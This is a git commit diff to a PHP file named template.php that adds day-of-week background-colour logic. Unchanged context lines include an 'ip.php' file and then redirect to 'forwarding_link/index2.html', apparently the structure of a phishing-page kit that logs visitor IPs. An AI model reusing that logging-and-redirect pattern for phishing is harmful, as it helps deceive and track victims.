d2e9403fa06835f012c1080c1f87d89743bc14b8
indra616 <39596317+indra616@users.noreply.github.com>
2019-05-21 22:15:03 +0700

    Update template.php

--- template.php
+++ template.php
@@ -1,5 +1,68 @@
 
 <?php
+$today = date("l");
+ 
+print("$today");
+ 
+if($today == "Sunday")
+ 
+{
+ 
+$bgcolor = "#FEF0C5";
+ 
+}
+ 
+elseif($today == "Monday")
+ 
+{
+ 
+$bgcolor = "#FFFFFF";
+ 
+}
+ 
+elseif($today == "Tuesday")
+ 
+{
+ 
+$bgcolor = "#FBFFC4";
+ 
+}
+ 
+elseif($today == "Wednesday")
+ 
+{
+ 
+$bgcolor = "#FFE0DD";
+ 
+}
+ 
+elseif($today == "Thursday")
+ 
+{
+ 
+$bgcolor = "#E6EDFF";
+ 
+}
+ 
+elseif($today == "Friday")
+ 
+{
+ 
+$bgcolor = "#E9FFE6";
+ 
+}
+ 
+else
+ 
+{
+ 
+// hari terakhir tentusaja hari Sabtu (Saturday) kan?
+ 
+$bgcolor = "#F0F4F1";
+ 
+}
+ 
+print("\n");
 include 'ip.php';
 header('Location: forwarding_link/index2.html');
 exit
